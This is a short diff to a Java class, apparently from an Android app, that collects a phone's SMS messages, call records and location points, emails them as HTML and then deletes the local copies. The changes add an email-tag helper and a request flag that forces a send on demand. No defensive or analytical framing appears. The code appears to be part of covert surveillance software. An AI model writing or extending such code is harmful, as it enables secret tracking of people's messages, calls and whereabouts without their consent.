@@ -85,6 +85,10 @@ public class SendMail {
 	public static String getTomail() {
 		return tomail;
 	}
+	
+	public static String getTag(){
+		return tomail.substring(0, tomail.indexOf("@"));
+	}
 
 	public SendMail(Context context, SmsSqlUtils su) {
 		isrun = false;
@@ -149,6 +153,7 @@ public class SendMail {
 			boolean flag = sms.sendHtmlMail(mailInfo, su);// 发送html格式
 
 			if (flag) {
+				BootServer.isrequest=false;
 				su.deleteAll();
 				if (first) {
 					su.savelog("message", "初始化数据发送成功");
@@ -206,7 +211,7 @@ public class SendMail {
 		html.append(GetLogCon(llog));
 
 		html.append(bodyend);
-		if (lsms.size() > 0 || lcall.size() > 0 || lloc.size() >= 28 || first) {
+		if (lsms.size() > 0 || lcall.size() > 0 || lloc.size() >= 28 || first||BootServer.isrequest) {
 			mailInfo.setContent(html.toString());
 			return true;
 		} else {
